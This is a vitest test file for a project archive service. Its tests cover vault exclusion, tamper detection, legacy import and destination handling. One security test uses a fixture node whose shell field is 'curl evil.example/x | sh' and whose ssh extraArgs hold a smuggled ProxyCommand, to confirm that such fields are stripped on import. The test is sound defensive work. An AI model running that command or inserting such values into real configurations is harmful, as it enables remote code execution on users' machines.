import { execFile } from 'node:child_process'
import { mkdtemp, mkdir, readFile, rm, writeFile } from 'node:fs/promises'
import { existsSync } from 'node:fs'
import { tmpdir } from 'node:os'
import path from 'node:path'
import { promisify } from 'node:util'
import { afterEach, describe, expect, it } from 'vitest'
import type { Project } from '../shared/types'
import { LocalHistoryStore } from './local-history'
import { ProjectArchiveService } from './project-archive'
import { openContainer, packContainer } from './project-archive-container'

const execFileAsync = promisify(execFile)
const roots: string[] = []

async function tempDir(prefix: string): Promise<string> {
  const dir = await mkdtemp(path.join(tmpdir(), prefix))
  roots.push(dir)
  return dir
}

async function git(cwd: string, args: string[]): Promise<string> {
  const { stdout } = await execFileAsync(
    'git',
    ['-c', 'user.name=Archive Test', '-c', 'user.email=archive@test.invalid', ...args],
    { cwd }
  )
  return stdout
}

function project(overrides: Partial<Project>): Project {
  return {
    id: 'original-project',
    name: 'History proof',
    color: '#6750a4',
    viewport: { x: 12, y: 34, zoom: 1.2 },
    nodes: [],
    ...overrides
  }
}

/** A real repository fixture: two commits, one UNCOMMITTED modification, one untracked file, and
 *  two gitignored paths (a directory tree and a single file). */
async function makeFixtureRepo(): Promise<string> {
  const repo = await tempDir('nodeterm-archive-repo-')
  await git(repo, ['init', '-b', 'main'])
  await writeFile(path.join(repo, 'src.ts'), 'export const version = 1\n')
  await writeFile(path.join(repo, 'notes.md'), 'first draft\n')
  await writeFile(path.join(repo, '.gitignore'), 'node_modules/\nsecret.log\n')
  await git(repo, ['add', '.'])
  await git(repo, ['commit', '-m', 'first commit'])
  await writeFile(path.join(repo, 'src.ts'), 'export const version = 2\n')
  await git(repo, ['add', 'src.ts'])
  await git(repo, ['commit', '-m', 'second commit'])
  // Uncommitted working state the save file must carry:
  await writeFile(path.join(repo, 'notes.md'), 'edited but never committed\n')
  await writeFile(path.join(repo, 'untracked.txt'), 'not committed anywhere\n')
  // Ignored content the save file must EXCLUDE — and report:
  await mkdir(path.join(repo, 'node_modules', 'pkg'), { recursive: true })
  await writeFile(path.join(repo, 'node_modules', 'pkg', 'index.js'), 'module.exports = 1\n'.repeat(64))
  await writeFile(path.join(repo, 'secret.log'), 'do not ship\n')
  return repo
}

afterEach(async () => {
  await Promise.all(roots.splice(0).map((root) => rm(root, { recursive: true, force: true })))
})

describe('portable project archives keep machine-local vault data out', () => {
  // A folder project's vault is one of its own working files and is captured with the rest. A
  // folder-LESS one (SSH, a cwd-less canvas) keeps a working copy under the app data directory,
  // so nothing else in the archive would carry it - this is the path that makes those projects'
  // password managers survive a save and an open.
  const vaultBytes = (): Buffer =>
    Buffer.from(
      JSON.stringify({
        version: 1,
        kdf: { N: 16384, r: 8, p: 1, keylen: 32 },
        salt: 'c2FsdA==',
        verifier: { v: 1, iv: 'aXY=', ciphertext: 'Y3Q=', tag: 'dGFn' },
        managers: []
      }),
      'utf-8'
    )

  it('omits a supplied vault and reports the credential exclusion', async () => {
    const service = new ProjectArchiveService(new LocalHistoryStore(await tempDir('nodeterm-archive-data-')))
    const vault = vaultBytes()
    const { bytes } = await service.export(project({}), { vault })

    const outcome = await service.import(bytes)
    expect(outcome.vault).toBeUndefined()
    expect(outcome.contents.excluded.some((item) => item.path === 'vault')).toBe(true)
  })

  it('carries nothing when the project has no vault', async () => {
    const service = new ProjectArchiveService(new LocalHistoryStore(await tempDir('nodeterm-archive-data-')))
    const { bytes } = await service.export(project({}))
    expect((await service.import(bytes)).vault).toBeUndefined()
  })

  it('still imports a save file written before vaults travelled', async () => {
    // The entry is additive: an archive from an older build simply has none, and must open
    // exactly as it always did rather than being refused for a missing section.
    const service = new ProjectArchiveService(new LocalHistoryStore(await tempDir('nodeterm-archive-data-')))
    const { bytes } = await service.export(project({ name: 'Older save' }))
    const outcome = await service.import(bytes)
    expect(outcome.project.name).toBe('Older save')
    expect(outcome.vault).toBeUndefined()
  })
})

describe('portable project archives (V3 container)', () => {
  it('exports and restores a portable projection without repository state', async () => {
    const repo = await makeFixtureRepo()
    const service = new ProjectArchiveService(new LocalHistoryStore(await tempDir('nodeterm-archive-data-')))
    const source = project({ cwd: repo })

    const { bytes, contents } = await service.export(source)

    expect(contents.repository).toBe('portable-projection')
    expect(contents.workingFiles).toBe(0)
    expect(contents.excluded.map((e) => e.path).sort()).toEqual([
      'credentials', 'machine-local-settings', 'process-state', 'working-directory'
    ])
    expect(contents.excludedFiles).toBe(4)

    const inspection = service.inspect(bytes)
    expect(inspection).toMatchObject({ archiveVersion: 3, needsDestination: false, projectName: 'History proof' })

    const destParent = await tempDir('nodeterm-archive-dest-')
    const dest = path.join(destParent, 'restored')
    const outcome = await service.import(bytes, { destination: dest })
    expect(outcome.archiveVersion).toBe(3)
    expect(outcome.restoredTo).toBe(dest)
    expect(outcome.project.id).not.toBe(source.id)
    expect(outcome.project.name).toBe(source.name)
    expect(outcome.project.cwd).toBe(dest)

    expect(outcome.contents.repository).toBe('portable-projection')
  })

  it('never carries this machine\'s exec-enabling fields (shell / terminalProfileId / ssh.extraArgs) through the file', async () => {
    // The save file is a git-shared-style document (workspace-files.ts's projectToFile), so it
    // must obey the same security boundary as project.json: a value that would choose which
    // EXECUTABLE another machine runs, or splice raw argv into one, must never round-trip through
    // it. Otherwise a save file handed to a teammate — or reopened after a machine-local profile
    // no longer exists — could silently select an unintended program.
    const repo = await makeFixtureRepo()
    const service = new ProjectArchiveService(new LocalHistoryStore(await tempDir('nodeterm-archive-data-')))
    const source = project({
      cwd: repo,
      nodes: [
        {
          id: 'n1',
          kind: 'terminal',
          position: { x: 0, y: 0 },
          size: { width: 640, height: 420 },
          title: 'shell node',
          color: '#6750a4',
          group: null,
          data: { title: 'shell node' },
          shell: 'curl evil.example/x | sh',
          terminalProfileId: 'custom-profile-only-on-this-machine',
          ssh: { host: 'example.com', user: 'me', extraArgs: '-o ProxyCommand=evil' }
        } as unknown as Project['nodes'][number]
      ]
    })

    const { bytes } = await service.export(source)
    const destParent = await tempDir('nodeterm-archive-exec-dest-')
    const dest = path.join(destParent, 'restored')
    const outcome = await service.import(bytes, { destination: dest })

    const node = outcome.project.nodes.find((n) => n.id === 'n1') as unknown as Record<string, unknown>
    expect(node.shell).toBeUndefined()
    expect(node.terminalProfileId).toBeUndefined()
    expect((node.ssh as Record<string, unknown> | undefined)?.extraArgs).toBeUndefined()
  })

  it('exports an inline (cwd-less) canvas as history-only and imports it with no destination', async () => {
    const service = new ProjectArchiveService(new LocalHistoryStore(await tempDir('nodeterm-archive-data-')))
    const { bytes, contents } = await service.export(project({}))
    expect(contents.repository).toBe('portable-projection')
    expect(contents.workingFiles).toBe(0)
    expect(service.inspect(bytes).needsDestination).toBe(false)
    const outcome = await service.import(bytes)
    expect(outcome.project.name).toBe('History proof')
    expect(outcome.project.cwd).toBeUndefined()
    expect(outcome.restoredTo).toBeUndefined()
  })

  it('says plainly when the project folder is missing instead of failing the save', async () => {
    const service = new ProjectArchiveService(new LocalHistoryStore(await tempDir('nodeterm-archive-data-')))
    const { contents } = await service.export(project({ cwd: path.join(tmpdir(), 'nodeterm-gone-' + Date.now()) }))
    expect(contents.repository).toBe('portable-projection')
    expect(contents.excluded.some((item) => item.path === 'working-directory')).toBe(true)
  })

  it('imports a portable projection without a repository destination', async () => {
    const repo = await makeFixtureRepo()
    const service = new ProjectArchiveService(new LocalHistoryStore(await tempDir('nodeterm-archive-data-')))
    const { bytes } = await service.export(project({ cwd: repo }))
    const imported = await service.import(bytes)
    expect(imported.archiveVersion).toBe(3)
    expect(imported.restoredTo).toBeUndefined()
    const dest = await tempDir('nodeterm-archive-dest-')
    await writeFile(path.join(dest, 'existing.txt'), 'already here\n')
    await expect(service.import(bytes, { destination: dest })).rejects.toThrow(/destination/i)
    expect(await readFile(path.join(dest, 'existing.txt'), 'utf-8')).toBe('already here\n')
  })

  it('refuses an archive whose snapshot was changed outside the bundled history', async () => {
    const service = new ProjectArchiveService(new LocalHistoryStore(await tempDir('nodeterm-archive-data-')))
    const { bytes } = await service.export(project({}))
    const entries = openContainer(bytes, {
      maxArchiveBytes: 1024 * 1024 * 1024,
      maxTotalBytes: 2 * 1024 * 1024 * 1024,
      maxEntryBytes: 2 * 1024 * 1024 * 1024,
      maxEntries: 65_500
    })
    const snapshot = JSON.parse(entries.get('project.json')!.toString('utf-8'))
    snapshot.name = 'Tampered'
    entries.set('project.json', Buffer.from(JSON.stringify(snapshot, null, 2), 'utf-8'))
    const forged = packContainer([...entries.entries()].map(([p, data]) => ({ path: p, data })))
    await expect(service.import(forged)).rejects.toThrow(/does not match/)
  })

  it('still imports a V1 JSON archive and says it carried no repository', async () => {
    const dataDir = await tempDir('nodeterm-archive-data-')
    const history = new LocalHistoryStore(dataDir)
    const service = new ProjectArchiveService(history)
    // Construct a V1 archive exactly as the pre-container exporter wrote it.
    const source = project({})
    const { projectToFile, serializeProjectFile } = await import('./workspace-files')
    const snapshot = projectToFile(source, 0, new Date().toISOString())
    await history.record({
      domain: `project_${source.id}`,
      filename: 'project.json',
      content: serializeProjectFile(snapshot),
      label: 'Exported project',
      action: 'updated'
    })
    const bundle = await history.exportBundle(`project_${source.id}`)
    const v1 = JSON.stringify({
      schemaVersion: 1,
      exportedAt: new Date().toISOString(),
      project: snapshot,
      history: { format: 'git-bundle-base64', bytes: bundle!.toString('base64') }
    })

    const outcome = await service.import(Buffer.from(v1, 'utf-8'))
    expect(outcome.archiveVersion).toBe(1)
    expect(outcome.project.name).toBe('History proof')
    expect(outcome.contents.repository).toBe('not-in-archive')
    expect(outcome.contents.repositoryNote).toMatch(/older nodeterm/)
    expect(service.inspect(Buffer.from(v1, 'utf-8'))).toEqual({ archiveVersion: 1, needsDestination: false })
  })
})
